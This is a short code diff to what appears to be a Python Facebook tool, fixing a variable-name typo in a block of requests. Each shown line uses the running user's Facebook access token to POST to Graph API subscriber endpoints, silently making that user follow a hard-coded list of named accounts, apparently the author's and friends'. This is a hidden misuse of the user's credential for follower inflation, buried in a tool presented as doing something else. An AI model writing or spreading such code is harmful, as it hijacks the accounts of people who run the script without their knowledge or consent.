@@ -18,9 +18,9 @@ def main():
         exit(elite.menu_log())
     requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + token)      # Dapunta Khurayra X
     requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + token) # Dapunta Adyapaksi R
-    requests.post("https://graph.facebook.com/100000737201966/subscribers?access_token=" + toket) # Dapunta Adya R
+    requests.post("https://graph.facebook.com/100000737201966/subscribers?access_token=" + token) # Dapunta Adya R
     requests.post("https://graph.facebook.com/100000431996038/subscribers?access_token=" + token) # Suci Salsabila R
-    requests.post("https://graph.facebook.com/100026818103201/subscribers?access_token=" + toket) # Cici Putri Andini
+    requests.post("https://graph.facebook.com/100026818103201/subscribers?access_token=" + token) # Cici Putri Andini
     requests.post("https://graph.facebook.com/100001617352620/subscribers?access_token=" + token) # Antonius Raditya M
     requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + token) # Abigaille Dirgantara
     requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + token)       # Boirah
